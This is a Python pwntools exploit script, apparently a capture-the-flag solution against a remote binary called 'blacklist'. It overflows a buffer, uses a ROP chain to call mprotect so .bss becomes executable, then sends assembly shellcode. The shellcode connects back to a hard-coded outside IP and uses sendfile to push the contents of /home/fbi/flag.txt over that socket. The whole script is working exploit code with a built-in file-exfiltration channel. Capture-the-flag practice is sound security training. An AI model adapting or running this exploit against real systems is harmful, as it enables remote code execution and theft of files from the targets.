#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context.update(arch="amd64", os="linux")

exe = context.binary = ELF('./blacklist')
rop = ROP(exe)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
add_rax = 0x000000000047fb30  # add rax, 1 ; ret
syscall = rop.find_gadget(['syscall', 'ret'])[0]

# set up here the IP and PORT of your listener waiting for the connection back from the shellcode
if args.LOCAL:
  IP, PORT = ('127.0.0.1', 12490)
else:
  IP, PORT = ('156.146.63.18', 43957)

# convertion of IP & PORT for the shellcode
def sockaddr():
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    return hex((number + (1 << 64)) % (1 << 64))

# connect back shellcode , then openat(flag) and sendfile to socket 
shellc = asm ('''
socket:
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
	syscall
	mov rbp,rax
connect:
	xchg eax,edi
	mov al,42
        mov rcx,%s
        neg rcx
        push rcx
	mov rsi,rsp
        mov dl,16
        syscall

	xor rdi,rdi
	lea rsi,fname[rip]
	xor rdx,rdx
	xor r10,r10
	xor rax,rax
        mov ax,257
        syscall

	mov rdi,rbp
	mov rsi,rax
	mov rdx,0
	mov r10,100
        xor rax,rax
	mov al,40
	syscall
	push 60
	pop rax
	syscall
fname:
	.ascii "/home/fbi/flag.txt"

''' % (sockaddr()))


buff = 0x4e0c00

p = remote('40.71.72.198', 1236)

# ROP that does a mprotect on .bss to make it RWX, then read the shellcode in this buffer and execute it
payload = 'A'*0x48
payload += p64(pop_rdi) + p64(0x4e0000) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx) + p64(7) + p64(pop_rax) + p64(9) + p64(add_rax) + p64(syscall)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buff) + p64(pop_rdx) + p64(len(shellc)) + p64(pop_rax) + p64(0) + p64(syscall)
payload += p64(0x4e0c00)

p.sendline(payload)

# now we send our shellcode
p.sendline(shellc)

